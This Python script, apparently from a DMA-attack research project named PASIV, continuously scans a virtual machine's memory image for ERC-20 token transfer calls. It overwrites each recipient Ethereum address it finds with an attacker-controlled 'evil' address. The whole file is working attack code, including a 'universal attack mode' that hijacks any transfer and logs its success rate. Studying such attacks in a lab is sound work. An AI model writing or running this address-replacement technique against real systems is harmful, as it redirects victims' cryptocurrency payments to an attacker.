#!/usr/bin/env python3
"""
PASIV ASCII Transfer Monitor - ERC-20 Transfer Pattern Detection (ASCII Format)
Continuously monitors VM memory for ASCII-encoded ERC-20 transfer function calls
and performs real-time address replacement attacks
"""

import time
import datetime
import sys
import signal
import os
import argparse
import re

MEMORY_FILE = './pasiv_vm_memory.img'
SCAN_INTERVAL = 0.1  # seconds between scans
CHUNK_SIZE = 64 * 1024 * 1024  # 64MB chunks for efficient scanning

# Hex pattern that appears before transfer selector  
PRE_TRANSFER_PATTERN = bytes.fromhex('05010000030000008a000000')  # 12 bytes
#PRE_TRANSFER_PATTERN = bytes.fromhex('')  # 12 bytes


# ERC-20 transfer function selector as ASCII hex string
TRANSFER_SELECTOR_ASCII = b'0xa9059cbb000000000000000000000000'  # 34 ASCII bytes
# Combined pattern: pre-pattern + ASCII transfer selector
COMBINED_PATTERN = PRE_TRANSFER_PATTERN + TRANSFER_SELECTOR_ASCII
ADDRESS_LENGTH = 40  # 40 hex characters for Ethereum address

class ASCIITransferMonitor:
    def __init__(self, target_address=None, memory_ranges=None, max_scans=None):
        self.target_address = target_address.lower().replace('0x', '') if target_address else None
        self.target_ascii = self.target_address.encode('ascii') if self.target_address else None
        self.memory_ranges = memory_ranges or []
        self.max_scans = max_scans  # None for continuous, number for limited scans
        self.last_positions = set()
        self.scan_count = 0
        self.start_time = datetime.datetime.now()
        self.attacks_performed = 0
        self.attacks_successful = 0
        self.replacement_counter = 0
        
    def generate_evil_address(self):
        """Generate evil address with counter for tracking"""
        self.replacement_counter += 1
        counter_hex = f"{self.replacement_counter:04x}"
        evil_hex = counter_hex + "66" * 18  # 4 digit counter + filler
        return evil_hex.encode('ascii')  # Return as ASCII bytes
        
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n[{datetime.datetime.now().strftime('%H:%M:%S')}] ASCII Transfer Monitor stopped")
        print(f"Total scans performed: {self.scan_count}")
        print(f"DMA attacks attempted: {self.attacks_performed}")
        print(f"DMA attacks successful: {self.attacks_successful}")
        if self.attacks_performed > 0:
            print(f"Attack success rate: {(self.attacks_successful/self.attacks_performed)*100:.1f}%")
        print(f"Runtime: {datetime.datetime.now() - self.start_time}")
        sys.exit(0)
        
    def log(self, message):
        """Log with timestamp"""
        timestamp = datetime.datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] {message}")
        
    def is_in_target_range(self, address):
        """Check if address falls within target memory ranges"""
        if not self.memory_ranges:
            return True
            
        address_hex = f"{address:x}"
        for range_prefix in self.memory_ranges:
            if address_hex.startswith(range_prefix.lower()):
                return True
        return False
        
    def should_scan_chunk(self, start_offset, chunk_size):
        """Check if chunk overlaps with any target memory ranges"""
        if not self.memory_ranges:
            return True
            
        end_offset = start_offset + chunk_size
        
        if self.is_in_target_range(start_offset) or self.is_in_target_range(end_offset):
            return True
            
        for range_prefix in self.memory_ranges:
            try:
                range_start = int(range_prefix + "0000", 16)
                range_end = int(range_prefix + "ffff", 16)
                
                if (range_start <= end_offset and range_end >= start_offset):
                    return True
            except ValueError:
                continue
                
        return False
        
    def scan_memory_chunk(self, file_handle, start_offset, chunk_size):
        """Scan a chunk of memory for ERC-20 transfer patterns"""
        file_handle.seek(start_offset)
        chunk = file_handle.read(chunk_size)
        
        if not chunk:
            return []
            
        positions = []
        search_start = 0
        
        # Search for the combined pattern (pre-pattern + transfer selector)
        while True:
            pos = chunk.find(COMBINED_PATTERN, search_start)
            if pos == -1:
                break
                
            # Address starts right after the combined pattern
            address_start = pos + len(COMBINED_PATTERN)
            
            # Make sure we have enough bytes for a full address
            if address_start + ADDRESS_LENGTH <= len(chunk):
                potential_address = chunk[address_start:address_start + ADDRESS_LENGTH]
                
                # Check if this looks like a hex address (all ASCII hex characters)
                try:
                    potential_address.decode('ascii')
                    # Verify it's all hex characters
                    if all(c in b'0123456789abcdefABCDEF' for c in potential_address):
                        # If we have a specific target, check for it; otherwise accept any valid address
                        if self.target_ascii is None or potential_address.lower() == self.target_ascii:
                            absolute_pos = start_offset + address_start
                            if self.is_in_target_range(absolute_pos):
                                positions.append((absolute_pos, potential_address))
                except UnicodeDecodeError:
                    pass
                    
            search_start = pos + 1
            
        return positions
        
    def scan_memory(self):
        """Scan memory for ASCII ERC-20 transfer patterns"""
        if not os.path.exists(MEMORY_FILE):
            self.log(f"ERROR: Memory file {MEMORY_FILE} not found")
            return []
            
        all_positions = []
        chunks_scanned = 0
        chunks_skipped = 0
        
        try:
            with open(MEMORY_FILE, 'rb') as f:
                f.seek(0, 2)
                file_size = f.tell()
                f.seek(0)
                
                offset = 0
                while offset < file_size:
                    remaining = file_size - offset
                    current_chunk_size = min(CHUNK_SIZE, remaining)
                    
                    if self.should_scan_chunk(offset, current_chunk_size):
                        positions = self.scan_memory_chunk(f, offset, current_chunk_size)
                        all_positions.extend(positions)
                        chunks_scanned += 1
                    else:
                        chunks_skipped += 1
                    
                    offset += current_chunk_size
                
                if self.memory_ranges and (chunks_scanned + chunks_skipped) > 0:
                    total_chunks = chunks_scanned + chunks_skipped
                    efficiency = (chunks_skipped / total_chunks) * 100
                    if self.scan_count == 0:  # Only log on first scan
                        self.log(f"   📊 Range filtering: {chunks_skipped}/{total_chunks} chunks skipped ({efficiency:.1f}% reduction)")
                    
        except Exception as e:
            self.log(f"ERROR scanning memory: {e}")
            return []
            
        return all_positions
        
    def show_context(self, position, original_address):
        """Show memory context around found transfer"""
        try:
            with open(MEMORY_FILE, 'rb') as f:
                # Read context around the transfer pattern
                context_start = max(0, position - 100)
                f.seek(context_start)
                before_bytes = f.read(position - context_start)
                
                f.seek(position)
                address_bytes = f.read(ADDRESS_LENGTH)
                
                f.seek(position + ADDRESS_LENGTH)
                after_bytes = f.read(100)
                
                self.log(f"   📍 ERC-20 Transfer Found at: 0x{position:x}")
                self.log(f"   🎯 Pattern: {COMBINED_PATTERN.hex()}")
                self.log(f"   ⬅️  100 bytes before: {before_bytes.hex()}")
                self.log(f"      ASCII: '{before_bytes.decode('ascii', errors='replace')}'")
                self.log(f"   🎯 Original address: {address_bytes.decode('ascii', errors='ignore')}")
                self.log(f"   ➡️  100 bytes after:  {after_bytes.hex()}")
                self.log(f"      ASCII: '{after_bytes.decode('ascii', errors='replace')}'")
                
        except Exception as e:
            self.log(f"   📄 Context read error: {e}")
            
    def perform_attack(self, position, original_address):
        """Replace target address with evil address"""
        try:
            evil_address = self.generate_evil_address()
            
            with open(MEMORY_FILE, 'r+b') as f:
                # Verify the original address is still there
                f.seek(position)
                current_bytes = f.read(ADDRESS_LENGTH)
                
                if current_bytes != original_address:
                    self.log(f"   ⚠️  Address changed before attack - skipping")
                    return False
                
                # Perform the replacement
                f.seek(position)
                f.write(evil_address)
                f.flush()
                
                # Verify the replacement
                f.seek(position)
                new_bytes = f.read(ADDRESS_LENGTH)
                
                if new_bytes == evil_address:
                    self.attacks_successful += 1
                    self.log(f"   🔥 DMA ATTACK SUCCESSFUL!")
                    self.log(f"   📍 Position: 0x{position:x}")
                    self.log(f"   💀 Original: {original_address.decode('ascii', errors='ignore')}")
                    self.log(f"   👹 Evil:     {evil_address.decode('ascii', errors='ignore')} (#{self.replacement_counter:04d})")
                    return True
                else:
                    self.log(f"   ❌ Attack verification failed")
                    return False
                    
        except Exception as e:
            self.log(f"   💥 ATTACK ERROR: {e}")
            return False
            
    def run(self):
        """Main monitoring loop"""
        signal.signal(signal.SIGINT, self.signal_handler)
        
        self.log("🚨 PASIV ASCII TRANSFER MONITOR STARTED")
        if self.target_address:
            self.log(f"Target address: 0x{self.target_address}")
        else:
            self.log("Target: ANY ERC-20 transfer (universal attack mode)")
        self.log(f"Evil address pattern: 0x[NNNN]666666666666666666666666666666666666")
        self.log(f"Combined Pattern: {COMBINED_PATTERN.hex()}")
        self.log(f"  Pre-pattern: {PRE_TRANSFER_PATTERN.hex()}")
        self.log(f"  Transfer selector (ASCII): {TRANSFER_SELECTOR_ASCII.decode('ascii')}")
        if self.memory_ranges:
            self.log(f"Memory ranges: {', '.join([f'0x{r}*' for r in self.memory_ranges])}")
        else:
            self.log(f"Memory ranges: ALL (no filtering)")
        if self.max_scans:
            self.log(f"Mode: Limited ({self.max_scans} scans)")
        else:
            self.log(f"Mode: Continuous monitoring")
        if not self.max_scans:
            self.log(f"Scan interval: {SCAN_INTERVAL} seconds")
        self.log("⚠️  DANGER: Will attack ERC-20 transfers in real-time!")
        if not self.max_scans:
            self.log("Press Ctrl+C to stop")
        self.log("-" * 60)
        
        while True:
            self.scan_count += 1
            positions = self.scan_memory()
            current_positions = set([pos[0] for pos in positions])  # Extract positions for comparison
            
            # Check for new ERC-20 transfers
            new_positions = current_positions - self.last_positions
            
            if new_positions:
                self.log(f"🎯 NEW ERC-20 TRANSFER(S) DETECTED! {len(new_positions)} location(s)")
                # Find full position data for new positions
                new_transfers = [pos for pos in positions if pos[0] in new_positions]
                for position, original_address in sorted(new_transfers):
                    self.attacks_performed += 1
                    self.show_context(position, original_address)
                    self.perform_attack(position, original_address)
                    self.log("-" * 40)
            elif positions:
                if self.scan_count == 1:
                    self.log(f"Found {len(positions)} existing ERC-20 transfer(s)")
                    for position, original_address in sorted(positions):
                        self.attacks_performed += 1
                        self.show_context(position, original_address)
                        self.perform_attack(position, original_address)
                        self.log("-" * 40)
                else:
                    self.log(f"Scan #{self.scan_count}: {len(positions)} transfer(s) (no changes)")
            else:
                self.log(f"Scan #{self.scan_count}: No ERC-20 transfers found")
                
            self.last_positions = current_positions
            
            # Check if we've reached the maximum number of scans
            if self.max_scans and self.scan_count >= self.max_scans:
                self.log(f"Completed {self.max_scans} scan(s) - stopping")
                break
                
            # Only sleep if we're continuing (not on the last scan)
            if not self.max_scans or self.scan_count < self.max_scans:
                time.sleep(SCAN_INTERVAL)

def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="PASIV ASCII Transfer Monitor - ERC-20 Transfer Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 ascii_transfer_monitor.py  # Attack ANY ERC-20 transfer
  python3 ascii_transfer_monitor.py 0x7ab874Eeef0169ADA0d225E9801A3FfFfa26aAC3  # Target specific address
  python3 ascii_transfer_monitor.py --ranges 1d27 --count 5  # Universal attack with constraints
  python3 ascii_transfer_monitor.py 0x7ab874Eeef0169ADA0d225E9801A3FfFfa26aAC3 -c 10 -r 1d27
        """
    )
    
    parser.add_argument(
        'target_address',
        nargs='?',  # Make target address optional
        help='Target Ethereum address to intercept in ERC-20 transfers (optional - if omitted, will attack ANY transfer)'
    )
    
    parser.add_argument(
        '--ranges', '-r',
        action='append',
        help='Memory address ranges to scan (hex prefixes). Can be used multiple times or comma-separated.'
    )
    
    parser.add_argument(
        '--count', '-c',
        type=int,
        help='Number of scans to perform (default: continuous monitoring)'
    )
    
    args = parser.parse_args()
    
    # Process ranges
    memory_ranges = []
    if args.ranges:
        for range_arg in args.ranges:
            ranges = [r.strip().lower().replace('0x', '') for r in range_arg.split(',')]
            memory_ranges.extend([r for r in ranges if r])
    
    # Validate Ethereum address if provided
    target = None
    if args.target_address:
        target = args.target_address.lower().replace('0x', '')
        if len(target) != 40:
            parser.error(f"Invalid Ethereum address length: {len(target)} (expected 40 hex characters)")
        
        try:
            int(target, 16)
        except ValueError:
            parser.error(f"Invalid hex characters in address: {target}")
    
    return target, memory_ranges, args.count

if __name__ == "__main__":
    try:
        target_address, memory_ranges, scan_count = parse_args()
        monitor = ASCIITransferMonitor(target_address, memory_ranges, scan_count)
        monitor.run()
    except KeyboardInterrupt:
        print("\nASCII Transfer Monitor stopped by user")
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1) 
